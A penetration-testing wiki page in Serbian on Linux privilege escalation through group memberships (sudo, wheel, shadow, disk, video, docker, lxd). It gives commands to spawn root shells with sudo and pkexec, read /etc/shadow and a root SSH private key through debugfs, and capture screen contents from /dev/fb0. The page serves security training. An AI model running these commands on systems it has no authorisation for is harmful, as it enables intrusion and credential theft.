{{#include ../../banners/hacktricks-training.md}}

# Sudo/Admin Grupe

## **PE - Metod 1**

**Ponekad**, **po defaultu \(ili zato što neki softver to zahteva\)** unutar **/etc/sudoers** fajla možete pronaći neke od ovih linija:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To znači da **bilo koji korisnik koji pripada grupi sudo ili admin može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
```text
sudo su
```
## PE - Metoda 2

Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako otkrijete da je binarni fajl pkexec SUID binarni fajl i da pripadate sudo ili admin grupi, verovatno biste mogli da izvršavate binarne fajlove kao sudo koristeći pkexec.  
Proverite sadržaj:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tamo ćete pronaći koje grupe imaju dozvolu da izvrše **pkexec** i **po defaultu** u nekim linux sistemima mogu **pojaviti** neke od grupa **sudo ili admin**.

Da **postanete root možete izvršiti**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nije zato što nemate dozvole, već zato što niste povezani bez GUI-a**. I postoji rešenje za ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebno vam je **2 različite ssh sesije**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Group

**Ponekad**, **po defaultu** unutar **/etc/sudoers** fajla možete pronaći ovu liniju:
```text
%wheel	ALL=(ALL:ALL) ALL
```
To znači da **bilo koji korisnik koji pripada grupi wheel može izvršavati bilo šta kao sudo**.

Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
```text
sudo su
```
# Shadow Group

Korisnici iz **grupe shadow** mogu **čitati** **/etc/shadow** datoteku:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Тако да, прочитајте датотеку и покушајте да **разбијете неке хешеве**.

# Диск Група

Ова привилегија је скоро **еквивалентна root приступу** јер можете приступити свим подацима унутар машине.

Фајлови: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Napomena da pomoću debugfs možete takođe **pisati fajlove**. Na primer, da kopirate `/tmp/asd1.txt` u `/tmp/asd2.txt` možete uraditi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Međutim, ako pokušate da **pišete datoteke koje su u vlasništvu root-a** \(kao što su `/etc/shadow` ili `/etc/passwd`\) dobićete grešku "**Permission denied**".

# Video Grupa

Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i prikazaće izlaz kao što je sledeći:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** znači da je korisnik **yossi fizički prijavljen** na terminalu na mašini.

**video grupa** ima pristup za pregled izlaza sa ekrana. U suštini, možete posmatrati ekrane. Da biste to uradili, potrebno je da **uhvatite trenutnu sliku na ekranu** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci sa ekrana mogu se sačuvati u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, odabrati **`screen.raw`** datoteku i odabrati tip datoteke **Raw image data**:

![](../../images/image%20%28208%29.png)

Zatim modifikujte Širinu i Visinu na one koje koristi ekran i proverite različite Tipove slika \(i odaberite onaj koji bolje prikazuje ekran\):

![](../../images/image%20%28295%29.png)

# Root Grupa

Izgleda da po defaultu **članovi root grupe** mogu imati pristup **modifikaciji** nekih **konfiguracionih** datoteka usluga ili nekih **biblioteka** ili **drugih interesantnih stvari** koje bi mogle biti korišćene za eskalaciju privilegija...

**Proverite koje datoteke članovi root grupe mogu modifikovati**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Grupa

Možete montirati root datotečni sistem host mašine na volumen instance, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup na mašini.

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

# lxc/lxd Grupa

[lxc - Eskalacija privilegija](lxd-privilege-escalation.md)

{{#include ../../banners/hacktricks-training.md}}
